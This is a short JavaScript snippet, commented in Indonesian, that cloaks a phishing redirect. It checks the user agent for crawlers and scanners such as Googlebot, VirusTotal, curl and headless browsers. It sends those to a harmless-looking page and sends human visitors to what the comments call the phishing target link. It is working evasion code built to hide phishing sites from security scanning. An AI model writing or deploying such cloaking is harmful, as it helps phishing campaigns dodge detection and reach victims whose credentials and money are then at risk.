(function() {
  const ua = navigator.userAgent.toLowerCase();
  const isBot = [
    'googlebot', 'bingbot', 'virustotal', 'curl',
    'wget', 'python', 'scrapy', 'crawler', 'headless'
  ].some(bot => ua.includes(bot));

  if (isBot) {
    // Redirect bot ke halaman aman atau umum
    window.location.href = 'https://zepra.pro';
  } else {
    // Redirect manusia ke link tujuan phishing
    window.location.href = 'https://x.com'; // ganti dengan link target
  }
})();